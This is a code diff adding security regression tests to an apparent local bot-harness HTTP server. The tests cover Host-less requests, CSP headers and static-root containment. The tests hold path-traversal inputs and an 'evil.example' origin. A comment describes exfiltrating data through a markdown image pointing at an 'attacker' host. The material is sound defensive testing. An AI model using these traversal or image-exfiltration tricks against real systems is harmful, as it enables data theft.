@@ -11,7 +11,24 @@ import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 
+import { connect } from "node:net";
+
 import { openSse } from "./testing/sse.ts";
+
+const CRLF = "\r\n";
+
+/** A literal request line on a raw socket — the only way to send no Host at
+ * all, which `http.request` always supplies for us. */
+const rawStatus = (requestLine: string): Promise<number> =>
+  new Promise((resolve, reject) => {
+    const socket = connect(PORT, "127.0.0.1", () => socket.write(requestLine));
+    let buffer = "";
+    socket.on("data", (chunk) => {
+      buffer += chunk;
+    });
+    socket.on("error", reject);
+    socket.on("close", () => resolve(Number(buffer.split(" ")[1] ?? 0)));
+  });
 
 const SERVER_DIR = dirname(fileURLToPath(import.meta.url));
 const ROOT = join(SERVER_DIR, "..");
@@ -81,6 +98,9 @@ beforeAll(async () => {
   mkdirSync(join(staticDir, "assets"), { recursive: true });
   writeFileSync(join(staticDir, "index.html"), "<!doctype html><title>Packaged MausCrew</title>");
   writeFileSync(join(staticDir, "assets", "smoke.css"), "body { color: white; }");
+  writeFileSync(join(staticDir, "manifest.webmanifest"), JSON.stringify({ name: "MausCrew Remote" }));
+  // a sibling of the static root, so an escape would be observable
+  writeFileSync(join(home, "outside.txt"), "must never be served");
   writeFileSync(
     join(home, ".mauscrew", "config.json"),
     JSON.stringify({ instances: { ghost: { driver: "not-a-real-driver", displayName: "Ghost" } } }),
@@ -160,6 +180,15 @@ describe("harness HTTP API", () => {
     expect(await statusWithHeaders({ origin: `http://[::1]:${PORT}` })).toBe(200);
   });
 
+  // Regression: `remoteUrl?.host === req.headers.host?.toLowerCase()` compared
+  // undefined to undefined when remote access was off, so a Host-less request
+  // skipped the untrusted-host refusal and read as a remote one. Must be 403
+  // (untrusted host), never 401 (pairing required) or 200.
+  it("refuses a request that carries no Host header at all", async () => {
+    expect(await rawStatus("GET /api/health HTTP/1.0" + CRLF + CRLF)).toBe(403);
+    expect(await rawStatus("POST /api/remote/claim HTTP/1.0" + CRLF + CRLF)).toBe(403);
+  });
+
   it("requires one-time desktop pairing on the configured remote HTTPS host", async () => {
     const host = "mauscrew-test.example";
     const origin = `https://${host}`;
@@ -182,12 +211,33 @@ describe("harness HTTP API", () => {
     expect((await requestWithHeaders("GET", "/api/bots", { host, origin: "https://evil.example", cookie })).status).toBe(403);
   });
 
+  it("reports and stores the analytics opt-out as a boolean", async () => {
+    expect((await api("GET", "/api/config")).body.analytics).toEqual({ enabled: true, locked: false });
+
+    expect((await api("PUT", "/api/config", { analytics: { enabled: "no" } })).status).toBe(400);
+    expect((await api("PUT", "/api/config", { analytics: true })).status).toBe(400);
+
+    expect((await api("PUT", "/api/config", { analytics: { enabled: false } })).status).toBe(200);
+    expect((await api("GET", "/api/config")).body.analytics).toEqual({ enabled: false, locked: false });
+    expect(JSON.parse(readFileSync(join(home, ".mauscrew", "config.json"), "utf8")).analytics).toEqual({
+      enabled: false,
+    });
+
+    expect((await api("PUT", "/api/config", { analytics: { enabled: true } })).status).toBe(200);
+    expect((await api("GET", "/api/config")).body.analytics.enabled).toBe(true);
+  });
+
   it("identifies itself on /api/health", async () => {
     const { status, body } = await api("GET", "/api/health");
     expect(status).toBe(200);
     expect(body.app).toBe("mauscrew");
     expect(typeof body.pid).toBe("number");
     expect(body.static).toBe(true);
+    // one owner name, one source — the health payload used to hardcode a
+    // different one than package.json and nothing noticed
+    const pkg = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8"));
+    expect(body.owner.name).toBe(pkg.author.name);
+    expect(body.owner.name).toBeTruthy();
   });
 
   it("serves packaged UI assets and preserves API 404s", async () => {
@@ -209,6 +259,44 @@ describe("harness HTTP API", () => {
     const unknownApi = await api("GET", "/api/not-a-real-route");
     expect(unknownApi.status).toBe(404);
     expect(unknownApi.body.error).toContain("/api/not-a-real-route");
+  });
+
+  it("hardens every static response and types the PWA manifest correctly", async () => {
+    const shell = await fetch(`${BASE}/`);
+    expect(shell.headers.get("x-content-type-options")).toBe("nosniff");
+    expect(shell.headers.get("cache-control")).toBe("no-cache");
+    const csp = shell.headers.get("content-security-policy") ?? "";
+    // the exfiltration channel this policy exists to close: a bot reply's
+    // `![](https://attacker/?d=…)` must not be a request the renderer makes
+    expect(csp).toContain("img-src 'self' data: blob:");
+    expect(csp).not.toContain("img-src 'self' data: blob: https:");
+    expect(csp).toContain("default-src 'self'");
+    expect(csp).toContain("object-src 'none'");
+    expect(csp).toContain("frame-ancestors 'none'");
+    // load-bearing: the Windows dictation AudioWorklet is built from a Blob
+    expect(csp).toContain("script-src 'self' blob:");
+
+    // served as application/octet-stream before, which is not a manifest
+    const manifest = await fetch(`${BASE}/manifest.webmanifest`);
+    expect(manifest.status).toBe(200);
+    expect(manifest.headers.get("content-type")).toBe("application/manifest+json");
+
+    // hashed asset names are the only thing safe to cache forever
+    const asset = await fetch(`${BASE}/assets/smoke.css`);
+    expect(asset.headers.get("cache-control")).toBe("public, max-age=31536000, immutable");
+    expect(asset.headers.get("content-security-policy")).toBe(csp);
+  });
+
+  it("never serves a file outside the static root", async () => {
+    // WHATWG URL normalisation already eats `..` before the handler sees it,
+    // so these are not live exploits — they pin the containment check that now
+    // stands on its own instead of depending on that happening to run first.
+    for (const path of ["/../outside.txt", "/..%2f..%2foutside.txt", "/....//outside.txt", "/assets/../../outside.txt"]) {
+      const res = await fetch(`${BASE}${path}`);
+      const body = await res.text();
+      expect(body).not.toContain("must never be served");
+      expect(body).toContain("Packaged MausCrew");
+    }
   });
 
   it("rejects malformed and oversized JSON bodies without hanging", async () => {
@@ -345,7 +433,6 @@ describe("harness HTTP API", () => {
       title: "Project Lead",
       description: "Coordinates the crew",
       color: "purple",
-      mascotExpression: "focused",
       autoApprove: true,
       alwaysAllow: ["Bash:git"],
     });
